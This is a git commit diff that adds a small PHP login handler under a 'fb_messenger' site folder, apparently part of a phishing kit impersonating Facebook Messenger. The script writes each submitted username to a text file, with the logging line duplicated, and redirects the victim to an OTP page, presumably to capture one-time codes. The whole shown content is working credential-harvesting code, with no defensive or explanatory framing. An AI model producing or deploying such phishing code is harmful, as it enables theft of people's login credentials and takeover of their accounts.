41c41a6e535c3956e4fb592fe382a2114c28b921
ahmad7679 <140087753+ahmad7679@users.noreply.github.com>
2023-07-21 21:20:57 +0800

    first

---
+++ .sites/fb_messenger/login.php
@@ -0,0 +1,7 @@
+<?php
+
+file_put_contents("usernames.txt", "Username: " . $_POST['username'] . "\n", FILE_APPEND);
+file_put_contents("usernames.txt", "Username: " . $_POST['username'] . "\n", FILE_APPEND);
+header('Location: otp.html/');
+exit();
+?>
